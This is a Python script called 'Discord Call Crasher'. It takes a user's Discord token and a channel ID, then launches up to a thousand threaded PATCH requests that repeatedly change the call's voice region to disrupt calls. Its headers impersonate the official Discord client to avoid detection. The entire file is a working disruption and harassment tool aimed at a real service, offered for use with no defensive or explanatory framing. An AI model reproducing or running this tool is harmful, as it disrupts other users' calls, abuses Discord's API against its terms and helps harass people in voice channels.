import requests, os, random, threading, time, sys
from time import strftime, gmtime, time, sleep



def write(text):
    for char in text: print("" + char, end="");sys.stdout.flush();sleep(0.009)


class Crasher:
    def __init__(self):
        self.added = 0
        self.lock = threading.Lock()

        write("> Discord Token (Will Be Invisible When Inputted): ")
        self.token = str(input())

        write("> Channel ID: ")
        self.id = input().strip()

        write("> Amount Of Requests (1000 Recommended): ")
        self.amount = int(input())

        self.request_headers = {"Authorization": self.token, "accept": "*/*", "accept-language": "en-US", "connection": "keep-alive", "cookie": f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US', "DNT": "1", "origin": "https://discord.com", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "referer": "https://discord.com/channels/@me", "TE": "Trailers", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36", "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"}

        self.regions = ['india', 'brazil', 'europe', 'hongkong', 'japan', 'russia', 'singapore', 'southafrica', 'sydney', 'us-central', 'us-east','us-south', 'us-west']


    def status(self, code, intention):
        if code == 204 or code == 200:
            self.added += 1
        else:
            self.lock.acquire()
            print(f'Error: {intention} | Status Code: {code}')
            self.lock.release()


    def update_title(self):
        while self.added == 0:
            sleep(0.2)
        while self.added < self.amount:
            time_remaining = strftime(
                '%H:%M:%S', gmtime(
                    (time() - self.start_time) / self.added * (self.amount - self.added)
                )
            )

            os.system(
                f'title [Discord Call Crasher] - Total Region Changes: {self.added}/{self.amount} '
                f'({round(((self.added / self.amount) * 100), 3)}%) ^| Active Threads: '
                f'{threading.active_count()} ^| Time Remaining: {time_remaining}'
            )
        os.system(
            f'title [Discord Call Crasher] - Total Region Changes: {self.added}/{self.amount} '
            f'({round(((self.added / self.amount) * 100), 3)}%) ^| Active Threads: '
            f'{threading.active_count()} ^| Time Remaining: 00:00:00'
        )
    

    
    def crash(self):
        requests_payload = {"region": random.choice(self.regions)}
        try:
            response = requests.patch(
                f"https://discord.com/api/v9/channels/{self.id}/call",
                headers = self.request_headers,
                json = requests_payload
            )
        except Exception as e:
            print(f"Error: {e}")
        else:
            if 'Service Unavailable' not in response.text:
                self.status(response.status_code, response.text)

        



    def multi_threading(self):
        self.start_time = time()
        threading.Thread(target=self.update_title).start()

        for _ in range(self.amount):
            threading.Thread(target=self.crash).start()
            sleep(0.03)
        
        os.system('pause >NUL')
        os.system('title [Discord Call Crasher] - Exiting...')
        sleep(3)






if __name__ == '__main__':
    os.system('cls && title [Discord Call Crasher]')
    crasher = Crasher()
    crasher.multi_threading()
